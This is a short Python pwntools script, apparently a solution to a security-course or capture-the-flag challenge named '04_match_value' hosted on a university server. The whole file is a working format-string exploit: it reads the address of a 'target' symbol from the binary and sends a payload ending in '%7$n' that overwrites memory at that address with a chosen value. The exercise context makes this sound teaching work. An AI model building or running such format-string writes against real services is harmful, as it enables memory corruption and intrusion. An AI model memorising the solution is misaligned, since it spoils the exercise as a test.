from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23194

s = remote(SERVER, PORT, timeout=9999)
elf = ELF("./04_match_value")
target_address = elf.symbols["target"]

s.sendline(p32(target_address) + b"%323x" + b"%7$n")
s.recvline()
s.recvline()
response = s.recvline()
print(response.decode())
